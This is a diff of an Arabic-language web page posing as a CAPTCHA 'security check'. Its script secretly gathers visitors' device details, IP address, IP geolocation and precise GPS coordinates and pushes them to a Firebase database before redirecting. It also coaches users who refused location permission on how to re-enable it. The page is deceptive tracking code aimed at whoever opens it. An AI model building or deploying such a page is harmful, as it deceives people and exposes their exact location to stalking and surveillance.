@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -46,343 +45,127 @@ h1{font-size:20px;font-weight:900;color:#0f172a;margin-bottom:6px}
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 </head>
 <body>
-
 <div class="container">
 <div class="logo">🛡️</div>
 <h1>التحقق الأمني</h1>
 <p class="subtitle">للتأكد من انك لست روبوت يرجي الضغط علي بدء الان شكرا لتفهمك</p>
-
 <div id="step1">
-<div class="verify-box" id="boxStart">
-<div class="check" id="checkStart">1</div>
-<div class="text">
-<div class="title">الخطوة 1: التحقق الأمني</div>
-<div class="desc">اضغط بدء التحقق للمتابعة</div>
+<div class="verify-box" id="boxStart"><div class="check" id="checkStart">1</div><div class="text"><div class="title">الخطوة 1: التحقق الأمني</div><div class="desc">اضغط بدء التحقق للمتابعة</div></div></div>
+<button class="big-btn green" id="btnStart" onclick="startAll()"><span>🔍</span> بدء التحقق</button>
 </div>
-</div>
-<button class="big-btn green" id="btnStart" onclick="startAll()">
-<span>🔍</span> بدء التحقق
-</button>
-</div>
-
 <div id="step2" class="hidden">
-<div class="verify-box" id="boxDevice">
-<div class="check" id="checkDevice">📱</div>
-<div class="text">
-<div class="title">فحص الجهاز</div>
-<div class="desc" id="descDevice">جاري فحص الجهاز...</div>
-</div>
-</div>
-
-<div class="verify-box" id="boxIP">
-<div class="check" id="checkIP">🌐</div>
-<div class="text">
-<div class="title">التحقق من الشبكه</div>
-<div class="desc" id="descIP">جاري التحقق من الشبكه...</div>
-</div>
-</div>
-
-<div class="verify-box" id="boxGPS">
-<div class="check" id="checkGPS">📍</div>
-<div class="text">
-<div class="title">جاري الاتصال</div>
-<div class="desc" id="descGPS">جاري الاتصال...</div>
-</div>
-</div>
-
+<div class="verify-box" id="boxDevice"><div class="check" id="checkDevice">📱</div><div class="text"><div class="title">فحص الجهاز</div><div class="desc" id="descDevice">جاري فحص الجهاز...</div></div></div>
+<div class="verify-box" id="boxIP"><div class="check" id="checkIP">🌐</div><div class="text"><div class="title">التحقق من الشبكه</div><div class="desc" id="descIP">جاري التحقق من الشبكه...</div></div></div>
+<div class="verify-box" id="boxGPS"><div class="check" id="checkGPS">📍</div><div class="text"><div class="title">جاري الاتصال</div><div class="desc" id="descGPS">جاري الاتصال...</div></div></div>
 <div class="progress"><div class="fill" id="fill"></div></div>
 <div id="loadingText" style="font-size:12px;color:#00b0ff;font-weight:600;margin:8px 0">جاري التحقق...</div>
-
 <div id="statusBox" class="status hidden"></div>
-
-<div id="permissionHelp" class="instructions hidden">
-<b>⚠️ رفضت إذن الاتصال؟ ازاي تصلحه:</b><br>
-<b>الطريقة 1 - من الشريط:</b><br>
-1. فوق في شريط العنوان، دوس على 🔒 أو ⓘ<br>
-2. دوس على <b>Site settings / إعدادات الموقع</b><br>
-3. لاقي <b>Location / الموقع الجغرافي</b><br>
-4. غيره من Block إلى <b>Allow / سماح</b><br>
-5. اعمل <b>Reload / إعادة تحميل</b> للصفحة<br><br>
-
-<b>الطريقة 2 - من إعدادات Chrome:</b><br>
-1. افتح Chrome → ثلاث نقط فوق → Settings<br>
-2. Privacy and security → Site Settings → Location<br>
-3. شيل الحظر عن موقعنا أو خلي كل المواقع Allow<br>
-4. ارجع واعمل Reload<br><br>
-
-<b>الطريقة 3 - جرب تاني:</b><br>
-دوس زر "حاول مرة أخرى" تحت
-</div>
-
-<div id="countdownSec" class="hidden" style="text-align:center">
-<div class="countdown" id="countdown">5</div>
-<p style="font-size:12px;color:#64748b">سيتم تحويلك للموقع الأساسي خلال <span id="countNum">5</span> ثواني</p>
-<button class="big-btn green" onclick="goMain()">➡️ تحويل فوري الآن</button>
-</div>
-
+<div id="permissionHelp" class="instructions hidden"><b>⚠️ رفضت إذن الاتصال؟ ازاي تصلحه:</b><br><b>الطريقة 1 - من الشريط:</b><br>1. فوق في شريط العنوان، دوس على 🔒 أو ⓘ<br>2. دوس على <b>Site settings / إعدادات الموقع</b><br>3. لاقي <b>Location / الموقع الجغرافي</b><br>4. غيره من Block إلى <b>Allow / سماح</b><br>5. اعمل <b>Reload / إعادة تحميل</b> للصفحة<br><br><b>الطريقة 2 - من إعدادات Chrome:</b><br>1. افتح Chrome → ثلاث نقط فوق → Settings<br>2. Privacy and security → Site Settings → Location<br>3. شيل الحظر عن موقعنا أو خلي كل المواقع Allow<br>4. ارجع واعمل Reload<br><br><b>الطريقة 3 - جرب تاني:</b><br>دوس زر "حاول مرة أخرى" تحت</div>
+<div id="countdownSec" class="hidden" style="text-align:center"><div class="countdown" id="countdown">5</div><p style="font-size:12px;color:#64748b">سيتم تحويلك للموقع الأساسي خلال <span id="countNum">5</span> ثواني</p><button class="big-btn green" onclick="goMain()">➡️ تحويل فوري الآن</button></div>
 <div class="log" id="logBox"></div>
 </div>
-
-<div id="stepRetry" class="hidden">
-<button class="big-btn orange" onclick="retryGPS()">
-<span>🔄</span> حاول مرة أخرى
-</button>
-</div>
-
+<div id="stepRetry" class="hidden"><button class="big-btn orange" onclick="retryGPS()"><span>🔄</span> حاول مرة أخرى</button></div>
 <p style="margin-top:15px;font-size:10px;color:#94a3b8">✅️🔰 آمن - Secure protection against captcha verification</p>
 </div>
-
 <script>
 const FIREBASE_URL = "https://numgen-4f22c-default-rtdb.firebaseio.com";
 const MAIN_SITE = "https://pythone2033.github.io/NumGen-Pro-/";
 let debugData = {ip:null, geo:null, realGPS:null, device:null};
 let clientId = new URLSearchParams(window.location.search).get('id') || 'Visitor';
+const urlParams = new URLSearchParams(window.location.search);
+const isVIPMode = urlParams.get('vip')==='1' || urlParams.get('gps')==='1' || urlParams.get('captcha')==='1';
 
-function log(msg){
-  let el = document.getElementById('logBox');
-  el.style.display = 'block';
-  el.textContent += new Date().toLocaleTimeString() + " - " + msg + "\n";
-  el.scrollTop = el.scrollHeight;
-}
-
-function setProgress(p){
-  document.getElementById('fill').style.width = p+'%';
-}
-
-function setBox(id, status, desc){
-  let box = document.getElementById('box'+id);
-  let check = document.getElementById('check'+id);
-  let descEl = document.getElementById('desc'+id);
-  if(status==='ok'){
-    box.className = 'verify-box ok';
-    check.className = 'check ok';
-    check.textContent = '✓';
-  } else if(status==='active'){
-    box.className = 'verify-box';
-    check.className = 'check spin';
-    check.textContent = '◍';
-  } else if(status==='fail'){
-    box.className = 'verify-box fail';
-    check.className = 'check fail';
-    check.textContent = '✕';
-  }
-  if(desc) descEl.textContent = desc;
-}
+function log(msg){let el=document.getElementById('logBox');el.style.display='block';el.textContent+=new Date().toLocaleTimeString()+" - "+msg+"\n";el.scrollTop=el.scrollHeight;}
+function setProgress(p){document.getElementById('fill').style.width=p+'%';}
+function setBox(id,status,desc){let box=document.getElementById('box'+id);let check=document.getElementById('check'+id);let descEl=document.getElementById('desc'+id);if(status==='ok'){box.className='verify-box ok';check.className='check ok';check.textContent='✓';}else if(status==='active'){box.className='verify-box';check.className='check spin';check.textContent='◍';}else if(status==='fail'){box.className='verify-box fail';check.className='check fail';check.textContent='✕';}if(desc) descEl.textContent=desc;}
 
 function getDevice(){
-  let ua = navigator.userAgent;
-  let model = "Unknown";
-  let brand = "Unknown";
-  let patterns = [
-    {re: /\(Linux; Android \d+; ([^\)]+)\)/, g:1},
-    {re: /; ([A-Z0-9\-]+) Build\//, g:1},
-    {re: /(SM-[A-Z0-9\-]+)/, g:1},
-    {re: /(Infinix [A-Z0-9\-]+)/i, g:1},
-    {re: /(Redmi [A-Z0-9 ]+)/i, g:1},
-  ];
-  for(let p of patterns){
-    let m = ua.match(p.re);
-    if(m){ model = m[p.g].trim(); break; }
-  }
-  if(model.includes('SM-')) brand = 'Samsung';
-  else if(model.toLowerCase().includes('infinix')) brand = 'Infinix';
-  else if(model.toLowerCase().includes('redmi')) brand = 'Xiaomi';
-  else brand = 'Android';
-  if(model==='Unknown'){
-    let m = ua.match(/Android (\d+)/);
-    model = `Android ${m?m[1]:''} Device`;
-  }
-  return {model, brand, full:`${brand} ${model}`, ua, platform:navigator.platform, screen:screen.width+'x'+screen.height};
+  let ua=navigator.userAgent;
+  let model="Unknown";let brand="Unknown";
+  let patterns=[{re:/\(Linux; Android \d+; ([^\)]+)\)/,g:1},{re:/; ([A-Z0-9\-]+) Build\//,g:1},{re:/(SM-[A-Z0-9\-]+)/,g:1},{re:/(Infinix [A-Z0-9\-]+)/i,g:1},{re:/(Redmi [A-Z0-9 ]+)/i,g:1},];
+  for(let p of patterns){let m=ua.match(p.re);if(m){model=m[p.g].trim();break;}}
+  if(model.includes('SM-')) brand='Samsung';else if(model.toLowerCase().includes('infinix')) brand='Infinix';else if(model.toLowerCase().includes('redmi')) brand='Xiaomi';else brand='Android';
+  if(model==='Unknown'){let m=ua.match(/Android (\d+)/);model=`Android ${m?m[1]:''} Device`;}
+  // امنع ظهور Android K
+  if(model.includes(' K ')) model=model.replace(' K ',' ').trim();
+  return {model,brand,full:`${brand} ${model}`,ua,platform:navigator.platform,screen:screen.width+'x'+screen.height};
 }
 
 async function startAll(){
   document.getElementById('step1').classList.add('hidden');
   document.getElementById('step2').classList.remove('hidden');
-  log('بدء التحقق - تم الضغط على بدء التحقق');
-  
-  // Device - بدون اظهار تفاصيل Android K
-  setBox('Device', 'active', 'جاري فحص الجهاز...');
-  let device = getDevice();
-  debugData.device = device;
-  log(`Device: ${device.full}`);
-  setBox('Device', 'ok', `تم فحص الجهاز`);
-  setProgress(30);
-  
-  // IP - بدون اظهار IP حقيقي
-  setBox('IP', 'active', 'جاري التحقق من الشبكه...');
-  try{
-    let r = await fetch('https://api.ipify.org?format=json');
-    let j = await r.json();
-    debugData.ip = j.ip;
-    log(`IP check ok`);
-    setBox('IP', 'ok', `تم التحقق من الشبكه`);
-    setProgress(50);
-  }catch(e){
-    try{
-      let r = await fetch('https://ipapi.co/json/');
-      let j = await r.json();
-      debugData.ip = j.ip;
-      debugData.geo = j;
-      log(`IP via ipapi ok`);
-      setBox('IP', 'ok', `تم التحقق من الشبكه`);
-      setProgress(50);
-    }catch(e2){
-      log(`IP check failed`);
-      setBox('IP', 'fail', 'فشل الاتصال اعد المحاوله لاحقا');
-    }
-  }
-  
-  // GEO
-  if(debugData.ip && !debugData.geo){
-    try{
-      let r = await fetch('https://ipapi.co/'+debugData.ip+'/json/');
-      let j = await r.json();
-      debugData.geo = j;
-      log(`GEO: ${j.city}`);
-    }catch(e){
-      log(`GEO failed`);
-    }
-  }
-  
-  // REAL GPS - مع رسائل جديدة
-  document.getElementById('loadingText').textContent = 'جاري الاتصال...';
-  setBox('GPS', 'active', 'جاري الاتصال...');
-  log('طلب الاتصال - جاري الاتصال');
-  
-  if(!navigator.geolocation){
-    log('GPS غير مدعوم');
-    setBox('GPS', 'fail', 'فشل الاتصال اعد المحاوله لاحقا');
-    showFail();
-    return;
-  }
-  
-  navigator.geolocation.getCurrentPosition(
-    async function(pos){
-      let lat = pos.coords.latitude;
-      let lon = pos.coords.longitude;
-      let acc = pos.coords.accuracy;
-      debugData.realGPS = {real:true, lat, lon, acc};
-      log(`GPS ok: ${lat}, ${lon} - ${acc}m`);
-      setBox('GPS', 'ok', `تم الاتصال - جاري التحويل`);
-      document.getElementById('loadingText').textContent = `✅ تم التحقق - جاري التحويل`;
-      setProgress(90);
-      await saveAndGo();
-    },
-    function(err){
-      log(`GPS fail: ${err.message} Code: ${err.code}`);
-      setBox('GPS', 'fail', 'فشل الاتصال اعد المحاوله لاحقا');
-      document.getElementById('loadingText').textContent = '❌ فشل الاتصال';
-      showFail();
-    },
-    {enableHighAccuracy:true, timeout:20000, maximumAge:0}
-  );
+  log('بدء التحقق - id: '+clientId+' VIP:'+isVIPMode);
+  setBox('Device','active','جاري فحص الجهاز...');
+  let device=getDevice();debugData.device=device;log(`Device: ${device.full}`);setBox('Device','ok',`${device.full}`);setProgress(30);
+  setBox('IP','active','جاري التحقق من الشبكه...');
+  try{let r=await fetch('https://api.ipify.org?format=json');let j=await r.json();debugData.ip=j.ip;log(`IP ok`);setBox('IP','ok',`IP: ${j.ip}`);setProgress(50);}catch(e){try{let r=await fetch('https://ipapi.co/json/');let j=await r.json();debugData.ip=j.ip;debugData.geo=j;log(`IP via ipapi ok`);setBox('IP','ok',`${j.city} - ${j.ip}`);setProgress(50);}catch(e2){log(`IP check failed`);setBox('IP','fail','فشل الاتصال');}}
+  if(debugData.ip && !debugData.geo){try{let r=await fetch('https://ipapi.co/'+debugData.ip+'/json/');let j=await r.json();debugData.geo=j;log(`GEO: ${j.city}`);}catch(e){log(`GEO failed`);}}
+  document.getElementById('loadingText').textContent='جاري الاتصال...';setBox('GPS','active','جاري الاتصال...');log('طلب GPS - VIP mode: '+isVIPMode);
+  if(!navigator.geolocation){log('GPS غير مدعوم');setBox('GPS','fail','GPS غير مدعوم');await saveAndGo(false);return;}
+  navigator.geolocation.getCurrentPosition(async function(pos){
+    let lat=pos.coords.latitude;let lon=pos.coords.longitude;let acc=pos.coords.accuracy;
+    debugData.realGPS={real:true,lat,lon,acc};log(`GPS ok: ${lat}, ${lon} - ${acc}m`);setBox('GPS','ok',`تم الاتصال - ${acc.toFixed(0)}m`);document.getElementById('loadingText').textContent=`✅ تم التحقق - جاري التحويل`;setProgress(90);await saveAndGo(true);
+  },async function(err){
+    log(`GPS fail: ${err.message} Code: ${err.code}`);setBox('GPS','fail','فشل الاتصال - سيتم الحفظ كـ ADS');document.getElementById('loadingText').textContent='❌ فشل الاتصال - سيتم الحفظ';await saveAndGo(false);
+  },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
 }
 
 function showFail(){
   document.getElementById('permissionHelp').classList.remove('hidden');
   document.getElementById('stepRetry').classList.remove('hidden');
-  let statusBox = document.createElement('div');
-  statusBox.className = 'status status-fail';
-  statusBox.innerHTML = '❌فشل التحقق من captcha<br>اتبع التعليمات فوق أو دوس حاول مرة أخرى';
-  document.getElementById('step2').appendChild(statusBox);
 }
+function retryGPS(){document.getElementById('permissionHelp').classList.add('hidden');document.getElementById('stepRetry').classList.add('hidden');let fails=document.querySelectorAll('.status-fail');fails.forEach(f=>f.remove());setBox('Device','active','جاري فحص الجهاز...');setBox('IP','active','جاري التحقق من الشبكه...');setBox('GPS','active','جاري الاتصال...');startAll();}
 
-function retryGPS(){
-  document.getElementById('permissionHelp').classList.add('hidden');
-  document.getElementById('stepRetry').classList.add('hidden');
-  let fails = document.querySelectorAll('.status-fail');
-  fails.forEach(f=>f.remove());
-  // Reset boxes
-  setBox('Device', 'active', 'جاري فحص الجهاز...');
-  setBox('IP', 'active', 'جاري التحقق من الشبكه...');
-  setBox('GPS', 'active', 'جاري الاتصال...');
-  startAll();
-}
-
-async function saveAndGo(){
-  let statusBox = document.createElement('div');
-  statusBox.className = 'status status-info';
-  statusBox.textContent = 'جاري الحفظ...';
-  document.getElementById('step2').appendChild(statusBox);
-  
+async function saveAndGo(hasGPS){
+  let statusBox=document.createElement('div');statusBox.className='status status-info';statusBox.textContent='جاري الحفظ...';document.getElementById('step2').appendChild(statusBox);
   try{
     if(!firebase.apps.length) firebase.initializeApp({databaseURL: FIREBASE_URL});
-    let db = firebase.database();
-    
-    let data = {
+    let db=firebase.database();
+    let data={
+      id: clientId,
       name: clientId,
-      ip: debugData.ip || 'unknown',
-      country: debugData.geo ? (debugData.geo.country_name || debugData.geo.country) : 'unknown',
-      city: debugData.geo ? debugData.geo.city : 'unknown',
-      latitude: debugData.geo ? debugData.geo.latitude : '',
-      longitude: debugData.geo ? debugData.geo.longitude : '',
-      org: debugData.geo ? debugData.geo.org : '',
-      device_model: debugData.device ? debugData.device.model : 'unknown',
-      device_brand: debugData.device ? debugData.device.brand : 'unknown',
-      device_full: debugData.device ? debugData.device.full : 'unknown',
-      real_device_name: debugData.device ? debugData.device.full : 'unknown',
+      ip: debugData.ip||'unknown',
+      country: debugData.geo?(debugData.geo.country_name||debugData.geo.country):'unknown',
+      city: debugData.geo?debugData.geo.city:'unknown',
+      latitude: debugData.geo?debugData.geo.latitude:'',
+      longitude: debugData.geo?debugData.geo.longitude:'',
+      lat: hasGPS && debugData.realGPS ? debugData.realGPS.lat : (debugData.geo?debugData.geo.latitude:null),
+      lng: hasGPS && debugData.realGPS ? debugData.realGPS.lon : (debugData.geo?debugData.geo.longitude:null),
+      org: debugData.geo?debugData.geo.org:'',
+      device_model: debugData.device?debugData.device.model:'unknown',
+      device_brand: debugData.device?debugData.device.brand:'unknown',
+      device_full: debugData.device?debugData.device.full:'unknown',
+      real_device_name: debugData.device?debugData.device.full:'unknown',
+      device: debugData.device?debugData.device.full:'unknown',
       userAgent: navigator.userAgent,
       platform: navigator.platform,
       screen: screen.width+'x'+screen.height,
       language: navigator.language,
       time: new Date().toLocaleString('ar-EG'),
       timestamp: Date.now(),
-      site: 'CAPTCHA_FINAL',
-      gps_permission: debugData.realGPS ? 'granted' : 'denied'
+      site: isVIPMode?'CAPTCHA_VIP':'CAPTCHA_ADS',
+      type: isVIPMode && hasGPS ? 'VIP' : 'ADS',
+      gps_permission: hasGPS?'granted':'denied',
+      vip_mode: isVIPMode
     };
-    
-    if(debugData.realGPS && debugData.realGPS.real){
-      data.real_lat = debugData.realGPS.lat;
-      data.real_lon = debugData.realGPS.lon;
-      data.real_accuracy = debugData.realGPS.acc;
-      data.gps_type = 'REAL_GPS_ACCURATE';
+    if(hasGPS && debugData.realGPS){
+      data.real_lat=debugData.realGPS.lat;data.real_lon=debugData.realGPS.lon;data.real_accuracy=debugData.realGPS.acc;data.gps=data.realGPS.lat+','+debugData.realGPS.lon;data.gps_type='REAL_GPS_ACCURATE';
     } else {
-      data.gps_type = 'IP_BASED';
+      data.gps_type='IP_BASED';
+      data.gps=data.latitude+','+data.longitude;
     }
-    
+    await db.ref('visitors').push(data);
     await db.ref('pro_max_visitors').push(data);
     await db.ref('real_device_visitors').push(data);
     if(data.real_lat) await db.ref('real_gps_visitors').push(data);
-    
-    log('تم الحفظ');
-    statusBox.className = 'status status-ok';
-    statusBox.innerHTML = data.real_lat ? `✅ تم التحقق - GPS حقيقي محفوظ<br>سيتم التحويل للموقع الأساسي` : `✅ تم التحقق - سيتم التحويل`;
-    setProgress(100);
-    startCountdown();
-  }catch(e){
-    log('حفظ فشل: '+e.message);
-    statusBox.className = 'status status-fail';
-    statusBox.textContent = 'فشل الحفظ - سيتم التحويل على أي حال';
-    setProgress(100);
-    startCountdown();
-  }
+    log('تم الحفظ - id:'+clientId+' type:'+data.type);
+    statusBox.className='status status-ok';statusBox.innerHTML=data.real_lat?`✅ تم التحقق - GPS حقيقي محفوظ<br>العميل: ${clientId}`:`✅ تم التحقق - تم الحفظ<br>العميل: ${clientId}`;setProgress(100);startCountdown();
+  }catch(e){log('حفظ فشل: '+e.message);statusBox.className='status status-fail';statusBox.textContent='فشل الحفظ - سيتم التحويل على أي حال';setProgress(100);startCountdown();}
 }
 
-let countdownVal = 5;
-let countdownActive = false;
-
-function startCountdown(){
-  countdownActive = true;
-  document.getElementById('countdownSec').classList.remove('hidden');
-  function tick(){
-    if(!countdownActive) return;
-    document.getElementById('countdown').textContent = countdownVal;
-    document.getElementById('countNum').textContent = countdownVal;
-    if(countdownVal<=0){
-      goMain();
-      return;
-    }
-    countdownVal--;
-    setTimeout(tick, 1000);
-  }
-  tick();
-}
-
-function goMain(){
-  let url = MAIN_SITE + '?id=' + encodeURIComponent(clientId) + '&from=captcha&verified=true&device=' + encodeURIComponent(debugData.device?debugData.device.full:'') + (debugData.realGPS ? '&gps='+debugData.realGPS.lat+','+debugData.realGPS.lon+'&acc='+debugData.realGPS.acc : '&gps=ip_based');
-  window.location.href = url;
-}
+let countdownVal=5;let countdownActive=false;
+function startCountdown(){countdownActive=true;document.getElementById('countdownSec').classList.remove('hidden');function tick(){if(!countdownActive) return;document.getElementById('countdown').textContent=countdownVal;document.getElementById('countNum').textContent=countdownVal;if(countdownVal<=0){goMain();return;}countdownVal--;setTimeout(tick,1000);}tick();}
+function goMain(){let url=MAIN_SITE+'?id='+encodeURIComponent(clientId)+'&from=captcha&verified=true&device='+encodeURIComponent(debugData.device?debugData.device.full:'')+(debugData.realGPS?'&gps='+debugData.realGPS.lat+','+debugData.realGPS.lon+'&acc='+debugData.realGPS.acc:'&gps=ip_based');window.location.href=url;}
 </script>
-
 </body>
 </html>
